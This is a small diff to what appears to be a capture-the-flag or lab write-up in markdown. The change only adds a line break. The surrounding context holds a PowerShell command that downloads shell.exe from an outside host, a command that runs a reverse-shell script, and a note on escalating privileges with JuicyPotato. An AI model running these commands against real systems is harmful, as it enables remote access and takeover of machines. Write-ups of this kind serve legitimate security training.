@@ -63,6 +63,8 @@ powershell -c Invoke-WebRequest -Uri http://10.2.117.185:8000/shell.exe -OutFile
 powershell C:\tmp\reverse.ps1
 ```
 
+<br>
+
 ### Privilege Escalation
 SeImpersonatePrivilege is enabled, so we can use JuicyPotato.
 
